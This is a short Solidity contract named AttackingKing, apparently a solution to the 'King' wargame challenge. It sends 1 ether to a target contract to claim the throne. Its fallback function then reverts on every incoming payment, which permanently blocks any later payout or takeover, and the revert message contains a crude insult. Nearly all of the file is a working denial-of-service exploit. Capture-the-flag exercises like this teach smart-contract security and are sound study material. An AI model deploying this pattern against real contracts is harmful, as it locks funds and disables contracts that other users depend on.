// SPDX-License-Identifier: MIT
pragma solidity ^0.8.9;
import "./King.sol";
import "hardhat/console.sol";

contract AttackingKing {
    address public contractAddress;

    constructor(address _contractAddress) payable {
        contractAddress = _contractAddress;
    }

    function hackContract() public payable {
         (bool result,bytes memory data ) = contractAddress.call{value: 1000000000000000000}("");
        if (!result) revert();
        
    }

fallback () external payable {
    revert("l'etat, c'est moi bitch");
}

}
